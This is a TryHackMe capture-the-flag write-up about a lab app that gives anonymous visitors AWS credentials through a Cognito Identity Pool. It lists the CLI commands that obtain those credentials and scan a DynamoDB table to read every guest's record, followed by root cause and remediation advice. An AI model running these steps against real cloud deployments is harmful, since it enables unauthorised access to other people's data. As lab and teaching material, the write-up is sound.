# Complimentary: TryHackMe Writeup

> **Category:** Cloud / Web · **Platform:** TryHackMe · **Focus:** AWS Cognito Identity Pools, IAM misconfiguration, DynamoDB
> **Vulnerability class:** Broken Access Control ([OWASP A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/))

## TL;DR

The *Byte Lotus Wellness* application uses an **unauthenticated Amazon Cognito Identity Pool** to hand every visitor temporary AWS credentials. The IAM role behind those credentials is over-permissioned: instead of allowing a single-record `GetItem`, it permits a full `Scan` of the backing DynamoDB table. By requesting an anonymous identity, exchanging it for credentials, and scanning the table directly, any visitor can read every guest's record, including the one holding the flag.

## Table of Contents

- [Objective](#objective)
- [Step 1: Inspect the Application](#step-1-inspect-the-application)
- [Step 2: Review the JavaScript](#step-2-review-the-javascript)
- [Step 3: Obtain an Identity ID](#step-3-obtain-an-identity-id)
- [Step 4: Obtain Temporary AWS Credentials](#step-4-obtain-temporary-aws-credentials)
- [Step 5: Configure the AWS CLI](#step-5-configure-the-aws-cli)
- [Step 6: Verify the Credentials](#step-6-verify-the-credentials)
- [Step 7: Enumerate DynamoDB](#step-7-enumerate-dynamodb)
- [Flag](#flag)
- [Root Cause](#root-cause)
- [Impact](#impact)
- [Remediation](#remediation)

## Objective

Determine how the *Byte Lotus Wellness* application identifies users without authentication, recover the AWS credentials it issues behind the scenes, and abuse the overly permissive configuration to read data belonging to other guests stored in DynamoDB.

## Step 1: Inspect the Application

Opening the application, there is no login or registration page. It immediately tries to retrieve wellness information for the visitor.

Viewing the page source shows the site loads an external JavaScript file, `app.js`, which holds the application's AWS configuration.

## Step 2: Review the JavaScript

`app.js` exposes several configuration values:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

Authentication is handled by an **Amazon Cognito Identity Pool**:

```javascript
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});
```

No credentials are requested from the user, so every visitor is automatically issued temporary AWS credentials through an **unauthenticated Cognito identity**.

The app then fetches a single guest record from DynamoDB:

```javascript
dynamodb.getItem({
    TableName: TABLE_NAME,
    Key: {
        guest_id: {
            S: guestId()
        }
    }
});
```

The `guest_id` is generated client-side and stored in the browser's Local Storage. There is no server-side check tying an identity to the records it may read.

## Step 3: Obtain an Identity ID

Request an unauthenticated Cognito identity with the AWS CLI:

```bash
aws cognito-identity get-id \
    --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
    --region us-east-1
```

The response returns an **Identity ID**:

```json
{
    "IdentityId": "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

## Step 4: Obtain Temporary AWS Credentials

Exchange the Identity ID for temporary credentials:

```bash
aws cognito-identity get-credentials-for-identity \
    --identity-id <IDENTITY_ID> \
    --region us-east-1
```

The response contains an `AccessKeyId`, `SecretKey`, and `SessionToken`, all corresponding to the application's unauthenticated Cognito role.

## Step 5: Configure the AWS CLI

Optionally save the response for reference, then export the values as environment variables:

```bash
aws cognito-identity get-credentials-for-identity \
    --identity-id <IDENTITY_ID> \
    --region us-east-1 > creds.json

export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretKey>
export AWS_SESSION_TOKEN=<SessionToken>
export AWS_REGION=us-east-1
```

## Step 6: Verify the Credentials

Confirm the credentials are valid and check which role was assumed:

```bash
aws sts get-caller-identity
```

A successful response confirms the CLI has assumed the unauthenticated Cognito role used by the web app.

## Step 7: Enumerate DynamoDB

The application only ever calls `GetItem` for a single record. The unauthenticated role, however, also permits a full table `Scan`:

```bash
aws dynamodb scan \
    --table-name complimentary-GuestWellnessProfiles
```

This returns every item in the table. Filtering the output for the flag prefix reveals another guest's record containing the flag:

```bash
aws dynamodb scan \
    --table-name complimentary-GuestWellnessProfiles \
    | grep -i "THM"
```

## Flag

```text
THM{REDACTED}
```

## Root Cause

The application uses an **Amazon Cognito Identity Pool** to issue temporary AWS credentials to unauthenticated visitors. Although the client only ever reads the current guest's record, the IAM policy attached to the unauthenticated role grants excessive permissions over the DynamoDB table, allowing `dynamodb:Scan` across all items rather than scoping access to the caller's own record. Because every visitor receives the same role, anyone can authenticate anonymously, obtain valid credentials, and enumerate the entire table.

## Impact

Any anonymous user can:

- Obtain valid AWS credentials without creating an account.
- Query the backend DynamoDB table directly via the AWS CLI or SDK.
- Read records belonging to other users.
- Exfiltrate sensitive information stored in the application.

In a production environment this is a significant **Broken Access Control (OWASP A01:2021)** issue driven by an overly permissive IAM policy on unauthenticated Cognito identities.

## Remediation

- **Least privilege on the IAM role.** Remove `dynamodb:Scan` and `Query` from the unauthenticated role and allow only `dynamodb:GetItem` on the specific table.
- **Scope access to the caller's identity.** Restrict item access using the Cognito identity as the key with a [`dynamodb:LeadingKeys`](https://docs.aws.amazon.com/amazon-dynamodb/latest/developerguide/specifying-conditions.html) condition, so a role can only read rows partitioned by its own `${cognito-identity.amazonaws.com:sub}`. Do not trust a client-generated `guest_id`.
- **Reconsider unauthenticated access.** If records are per-user and sensitive, require authenticated identities (for example a Cognito User Pool) rather than an anonymous pool.
- **Don't rely on client-side scoping.** The browser deciding which record to fetch is not an access control; enforcement must live in the IAM policy or a server-side API.
- **Monitor and alert.** Enable CloudTrail on the table and alert on `Scan` calls from the unauthenticated role, which should never occur in normal use.
